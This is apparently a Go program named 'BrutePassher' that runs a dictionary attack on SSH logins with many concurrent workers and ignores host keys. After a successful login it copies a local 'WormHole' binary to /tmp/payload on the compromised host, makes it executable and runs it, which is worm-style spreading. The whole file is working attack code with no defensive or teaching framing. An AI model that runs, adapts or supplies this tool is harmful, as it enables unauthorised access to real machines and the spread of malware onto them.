package main

import (
	"fmt"
	"os"
	"strconv"
	"strings"
	"sync"

	"github.com/tmc/scp"

	"golang.org/x/crypto/ssh"
)

func passher(ip string, user string, passwords chan string, wg *sync.WaitGroup) {
	for {
		pass := <-passwords
		sshConf := &ssh.ClientConfig{
			User: user,
			Auth: []ssh.AuthMethod{
				ssh.Password(pass),
			},
			HostKeyCallback: ssh.InsecureIgnoreHostKey(),
		}
		con, err := ssh.Dial("tcp", ip+":22", sshConf)
		if err == nil {
			fmt.Println("Password: " + pass)
			dir, _ := os.Getwd()
			s, _ := con.NewSession()
			s2, _ := con.NewSession()
			s3, _ := con.NewSession()
			scp.CopyPath(dir+"/WormHole", "/tmp/payload", s)
			s3.Run("chmod +x /tmp/payload")
			s2.Run("/tmp/payload")
		} else {
			//con.Close()
			wg.Done()
		}

	}
}

func main() {
	var wg sync.WaitGroup
	var workers int
	passwordList := make([]byte, 20000)
	passwords := make(chan string)
	if len(os.Args) < 3 {
		fmt.Println("Uso: BrutePassher IP User [workers]")
		os.Exit(0)
	}
	if len(os.Args) > 3 {
		workers, _ = strconv.Atoi(os.Args[3])
	} else {

		workers = 50
	}
	r, _ := os.Open("dict.txt")
	len, _ := r.Read(passwordList)
	passwordSlice := strings.Split(string(passwordList[:len]), "\n")
	for i := 0; i <= workers; i++ {
		go passher(os.Args[1], os.Args[2], passwords, &wg)
	}
	for _, password := range passwordSlice {
		passwords <- password
		wg.Add(1)
	}
	wg.Wait()
}
